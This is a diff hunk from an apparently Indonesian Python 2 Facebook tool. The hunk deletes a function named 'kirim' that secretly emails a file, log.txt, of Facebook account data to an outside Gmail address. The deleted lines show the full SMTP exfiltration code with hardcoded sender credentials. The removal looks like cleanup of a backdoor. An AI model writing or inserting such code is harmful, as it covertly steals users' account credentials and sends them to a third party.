@@ -10,30 +10,6 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-def kirim():
-    email_user = 'hackerhat710@gmail.com'
-    email_password = 'hackerhat'
-    email_send = 'defrimoito2001@gmail.com'
-    subject = '=== KIRIMAN NYA KAK ==='
-    msg = MIMEMultipart()
-    msg['From'] = email_user
-    msg['To'] = email_send
-    msg['Subject'] = subject
-    body = '====== AKUN FACEBOOK ======='
-    msg.attach(MIMEText(body, 'plain'))
-    filename = 'log.txt'
-    attachment = open('log.txt', 'rb')
-    part = MIMEBase('application', 'octet-stream')
-    part.set_payload(attachment.read())
-    encoders.encode_base64(part)
-    part.add_header('Content-Disposition', 'attachment; filename= ' + filename)
-    msg.attach(part)
-    text = msg.as_string()
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login(email_user, email_password)
-    server.sendmail(email_user, email_send, text)
-    server.quit()
 def keluar():
     print '\x1b[1;91m[!] Keluar'
     os.sys.exit()
